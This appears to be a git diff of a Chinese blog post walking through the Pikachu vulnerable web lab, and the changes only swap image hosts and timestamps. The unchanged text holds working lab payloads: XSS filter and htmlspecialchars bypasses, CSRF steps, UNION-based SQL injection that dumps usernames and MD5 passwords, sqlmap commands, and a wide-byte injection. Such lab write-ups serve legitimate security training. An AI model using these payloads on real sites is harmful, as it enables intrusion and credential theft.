@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-05T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-01T02:37:23.890Z">
+<meta property="article:modified_time" content="2026-05-14T10:08:14.843Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="XSS">
 <meta property="article:tag" content="SQL注入">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp2fxa5z">
+  <link rel="stylesheet" href="/css/main.css?v=mp5bt8nv">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-05T12:00:00+08:00","dateModified":"2026-05-01T10:37:23+08:00","datePublished":"2026-03-05T12:00:00+08:00","description":"","headline":"Pikachu 靶场通关笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/31fdd992/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/31fdd992/","keywords":"XSS, SQL注入, CSRF, 靶场, Pikachu","thumbnailUrl":"/images/pikachu.png","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-05T12:00:00+08:00","dateModified":"2026-05-14T18:08:14+08:00","datePublished":"2026-03-05T12:00:00+08:00","description":"","headline":"Pikachu 靶场通关笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/31fdd992/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/31fdd992/","keywords":"XSS, SQL注入, CSRF, 靶场, Pikachu","thumbnailUrl":"/images/pikachu.png","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -188,13 +188,13 @@
 </blockquote>
 <hr>
 <h3 id="1-1-反射型-XSS（DOM型）"><a href="#1-1-反射型-XSS（DOM型）" class="headerlink" title="1.1 反射型 XSS（DOM型）"></a>1.1 反射型 XSS（DOM型）</h3><p><strong>🔍 思路：</strong> 随便输入内容并查看页面源代码，定位到按钮触发的 JS 函数。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image1.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image2.png"></p>
 <p>找到按钮所绑定的函数后：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image3.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image3.png"></p>
 <p>发现参数被拼接到 <code>&lt;a&gt;</code> 标签中，可以利用单引号闭合属性来注入事件。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image4.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image4.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image5.png"></p>
 <blockquote>
 <p>⚠️ 注意：一定要使用<strong>英文单引号</strong>，中文单引号无效！</p>
 </blockquote>
@@ -202,44 +202,44 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
 <p>只需构造闭合，再点击 “xss” 链接：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image6.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image6.png"></p>
 <p>成功触发弹窗 🎉</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image7.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image7.png"></p>
 <hr>
 <h3 id="1-2-DOM型-XSS-x"><a href="#1-2-DOM型-XSS-x" class="headerlink" title="1.2 DOM型 XSS-x"></a>1.2 DOM型 XSS-x</h3><p><strong>🔍 思路：</strong> 与上一题类似，Payload 相同，但本题还支持通过 URL 参数提交（需手动点击一下触发）。</p>
 <p><strong>💣 Payload（URL 提交）：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=%27%20onclick=eval(&quot;alert(%27xss%27);&quot;&gt;xss&lt;/a&gt;#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image8.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image9.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image8.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image9.png"></p>
 <hr>
 <h3 id="1-3-XSS-盲打"><a href="#1-3-XSS-盲打" class="headerlink" title="1.3 XSS 盲打"></a>1.3 XSS 盲打</h3><p><strong>📖 概念：</strong> 盲打就是注入后在当前页面看不到效果，但 Payload 会在后台管理员查看时触发。</p>
 <p><strong>🔍 步骤：</strong></p>
 <ol>
 <li>在前台随意输入内容提交（包含 XSS Payload）</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image10.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image10.png"></p>
 <ol start="2">
 <li>登录后台查看留言</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image11.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image11.png"></p>
 <ol start="3">
 <li>后台页面触发弹窗 💥</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image12.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image12.png"></p>
 <ol start="4">
 <li>查看源代码，可以看到之前写入的 XSS 代码已被执行</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image13.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image14.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image13.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image14.png"></p>
 <hr>
 <h3 id="1-4-XSS-之过滤绕过"><a href="#1-4-XSS-之过滤绕过" class="headerlink" title="1.4 XSS 之过滤绕过"></a>1.4 XSS 之过滤绕过</h3><p><strong>📖 概念：</strong> 服务端对脚本标签进行了简单的关键字过滤，但过滤规则不完整，可通过大小写混用绕过。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image15.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image15.png"></p>
 <p><strong>💣 Payload（大小写混用绕过）：</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCript</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>成功执行 ✅</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image16.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image16.png"></p>
 <hr>
 <h3 id="1-5-XSS-之-htmlspecialchars"><a href="#1-5-XSS-之-htmlspecialchars" class="headerlink" title="1.5 XSS 之 htmlspecialchars"></a>1.5 XSS 之 htmlspecialchars</h3><p><strong>📖 概念：</strong> <code>htmlspecialchars</code> 是 PHP 中常见的 XSS 防御函数，可将特殊字符转义为 HTML 实体。但它存在以下几种绕过场景：</p>
 <table>
@@ -263,24 +263,24 @@
 </tr>
 </tbody></table>
 <p><strong>🔍 步骤：</strong> 输入代码没有反应，查看源代码发现输入被放入了 <code>&lt;a&gt;</code> 标签的属性中。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image17.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image18.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image17.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image18.png"></p>
 <p>发现是 <code>&lt;a&gt;</code> 标签中的单引号闭合问题，构造绕过：</p>
 <p><strong>💣 Payload：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1111) &#x27;</span><br></pre></td></tr></table></figure>
 
 <p>成功触发 🎉</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image19.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image19.png"></p>
 <hr>
 <h3 id="1-6-XSS-之-href-输出"><a href="#1-6-XSS-之-href-输出" class="headerlink" title="1.6 XSS 之 href 输出"></a>1.6 XSS 之 href 输出</h3><p><strong>🔍 思路：</strong> 查看源代码发现尖括号已被编码转义，无法直接插入标签。<br>可以使用不含尖括号的方案：</p>
 <p><strong>💣 Payload 一（属性事件注入）：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1111) &#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image20.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image20.png"></p>
 <p><strong>💣 Payload 二（javascript 伪协议）：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image21.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image21.png"></p>
 <p>两种方式均可成功执行 ✅</p>
 <hr>
 <h3 id="1-7-XSS-之-JS-输出"><a href="#1-7-XSS-之-JS-输出" class="headerlink" title="1.7 XSS 之 JS 输出"></a>1.7 XSS 之 JS 输出</h3><p><strong>📖 概念：</strong> 用户输入被直接拼接到 JS 代码块中，需要闭合 JS 字符串才能注入恶意代码。</p>
@@ -288,15 +288,15 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>查看源代码后，构造闭合注入：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image22.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image22.png"></p>
 <p><strong>💣 Payload 一（闭合字符串）：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image23.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image23.png"></p>
 <p><strong>💣 Payload 二（标签闭合绕过）：</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image24.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image24.png"></p>
 <p>两种方式均可成功触发 ✅</p>
 <hr>
 <h2 id="二、CSRF-跨站请求伪造"><a href="#二、CSRF-跨站请求伪造" class="headerlink" title="二、CSRF 跨站请求伪造"></a>二、CSRF 跨站请求伪造</h2><blockquote>
@@ -307,36 +307,36 @@
 <ol>
 <li>登录一个普通用户账号</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image25.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image26.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image25.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image26.png"></p>
 <ol start="2">
 <li>尝试修改个人信息，用 Burp Suite 抓包观察请求</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image27.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image27.png"></p>
 <ol start="3">
 <li>发现是 <strong>GET 方式</strong>发送的请求</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image28.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image28.png"></p>
 <ol start="4">
 <li>在 Burp 中右键 → 生成 CSRF PoC</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image29.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image29.png"></p>
 <ol start="5">
 <li>修改 PoC 中的目标参数后复制链接</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image30.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image31.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image30.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image31.png"></p>
 <ol start="6">
 <li>访问构造好的链接后，发现用户信息已被悄悄修改 ✅</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image32.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image32.png"></p>
 <hr>
 <h3 id="2-2-CSRF（POST）"><a href="#2-2-CSRF（POST）" class="headerlink" title="2.2 CSRF（POST）"></a>2.2 CSRF（POST）</h3><p><strong>📖 概念：</strong> 与 GET 型 CSRF 原理相同，区别在于请求使用 POST 方式发送，需要构造一个隐藏表单页面自动提交。</p>
 <hr>
 <h3 id="2-3-CSRF-Token"><a href="#2-3-CSRF-Token" class="headerlink" title="2.3 CSRF Token"></a>2.3 CSRF Token</h3><p><strong>📖 概念：</strong> 添加了随机 Token 验证，理论上无法直接伪造请求。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image33.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image33.png"></p>
 <p><strong>🔍 查看源代码：</strong> 发现 Token 存储在前端 HTML 中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image34.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image34.png"></p>
 <blockquote>
 <p>💡 <strong>绕过思路：</strong> 此处可配合 <strong>XSS 漏洞</strong>，先通过 XSS 读取页面中的 Token 值，再携带 Token 构造 CSRF 请求，实现完整攻击链：<code>XSS + CSRF</code>。</p>
 </blockquote>
@@ -349,99 +349,99 @@
 <ol>
 <li>输入数字，页面正常显示</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image35.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image35.png"></p>
 <ol start="2">
 <li>输入单引号 <code>&#39;</code>，页面报错 → 确认存在注入点</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image36.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image36.png"></p>
 <ol start="3">
 <li>使用 <code>ORDER BY</code> 探测列数，到 <code>2</code> 不报错，说明有 <strong>2 列输出</strong></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image37.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image37.png"></p>
 <ol start="4">
 <li>使用联合注入查询数据库信息</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image38.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image38.png"></p>
 <p><strong>💣 查表名：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image39.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image39.png"></p>
 <p><strong>💣 查列名：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image40.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image40.png"></p>
 <p><strong>💣 查数据：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image41.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image41.png"></p>
 <ol start="5">
 <li>密码经过 MD5 加密，使用在线工具解密：<a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e → 123456</span><br><span class="line">670b14728ad9902aecba32e22fa4f6bd → 123456</span><br><span class="line">e99a18c428cb38d5f260853678922e03 → abc123</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image42.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image42.png"></p>
 <hr>
 <h3 id="3-2-字符型注入"><a href="#3-2-字符型注入" class="headerlink" title="3.2 字符型注入"></a>3.2 字符型注入</h3><p><strong>🔍 思路：</strong> 参数被单引号包裹，需要用 <code>&#39;</code> 闭合原有引号再注入。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image43.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image44.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image43.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image44.png"></p>
 <p><strong>💣 Payload：</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image45.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image45.png"></p>
 <hr>
 <h3 id="3-3-搜索型注入"><a href="#3-3-搜索型注入" class="headerlink" title="3.3 搜索型注入"></a>3.3 搜索型注入</h3><p><strong>📖 概念：</strong> 后端 SQL 使用 <code>LIKE &#39;%$name%&#39;</code> 进行模糊查询，存在注入风险。</p>
 <p>使用 SQLMap 自动检测：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image46.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image46.png"></p>
 <hr>
 <h3 id="3-4-X-型注入"><a href="#3-4-X-型注入" class="headerlink" title="3.4 X 型注入"></a>3.4 X 型注入</h3><p><strong>📖 概念：</strong> SQL 语句结构为 <code>SELECT * FROM users WHERE (id=&#39;$id&#39;)</code>，参数被括号和引号包裹。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://pikachu/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image47.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image47.png"></p>
 <hr>
 <h3 id="3-5-INSERT-UPDATE-注入"><a href="#3-5-INSERT-UPDATE-注入" class="headerlink" title="3.5 INSERT &#x2F; UPDATE 注入"></a>3.5 INSERT &#x2F; UPDATE 注入</h3><p><strong>🔍 思路：</strong> 注入点位于 INSERT 或 UPDATE 语句中，建议将请求包保存为文件，再用 SQLMap 发包。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Backup\桌面\sql.txt --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image48.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image48.png"></p>
 <hr>
 <h3 id="3-6-DELETE-注入"><a href="#3-6-DELETE-注入" class="headerlink" title="3.6 DELETE 注入"></a>3.6 DELETE 注入</h3><p><strong>🔍 思路：</strong> 注入点位于 DELETE 语句中，通常通过 ID 参数传入。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image49.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image50.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image49.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image50.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SQLMap 检测</span></span><br><span class="line">python sqlmap.py -r sql.txt --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image51.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image51.png"></p>
 <hr>
 <h3 id="3-7-HTTP-头注入"><a href="#3-7-HTTP-头注入" class="headerlink" title="3.7 HTTP 头注入"></a>3.7 HTTP 头注入</h3><p><strong>📖 概念：</strong> 注入点不在 URL 参数中，而是在 HTTP 请求头（如 <code>User-Agent</code>、<code>X-Forwarded-For</code>、<code>Cookie</code> 等）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image52.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image53.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image52.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image53.png"></p>
 <blockquote>
 <p>⚠️ 注意识别正确的包，登录包不是目标，要找<strong>带有 UA 信息的业务包</strong>。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image54.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image54.png"></p>
 <p>这个才是目标包 👇</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image55.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image56.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image55.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image56.png"></p>
 <p>这是<strong>报错注入</strong>类型：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image57.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image57.png"></p>
 <hr>
 <h3 id="3-8-基于-Boolean-的盲注"><a href="#3-8-基于-Boolean-的盲注" class="headerlink" title="3.8 基于 Boolean 的盲注"></a>3.8 基于 Boolean 的盲注</h3><p><strong>📖 概念：</strong> 页面不返回具体数据，只通过 True&#x2F;False 的响应差异来逐位猜解数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image58.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image58.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;目标URL&quot;</span> --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image59.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image59.png"></p>
 <hr>
 <h3 id="3-9-基于时间的盲注"><a href="#3-9-基于时间的盲注" class="headerlink" title="3.9 基于时间的盲注"></a>3.9 基于时间的盲注</h3><p><strong>📖 概念：</strong> 注入后通过 <code>sleep()</code> 函数造成响应延迟，根据响应时间判断条件真假，逐步提取数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image60.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image60.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;目标URL&quot;</span> --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image61.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image61.png"></p>
 <hr>
 <h3 id="3-10-宽字节注入（Wide-Byte）"><a href="#3-10-宽字节注入（Wide-Byte）" class="headerlink" title="3.10 宽字节注入（Wide Byte）"></a>3.10 宽字节注入（Wide Byte）</h3><p><strong>📖 概念：</strong> 宽字节注入是针对<strong>字符编码过滤</strong>的绕过技术。当后端使用 GBK&#x2F;GB2312 编码且对单引号用 <code>\</code> 转义时，通过在单引号前插入 <code>%df</code>，使 <code>%df\</code> 被合并解析为一个合法的 GBK 汉字，从而”吃掉”反斜杠，让单引号逃逸。</p>
 <p><strong>💣 Payload：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
 
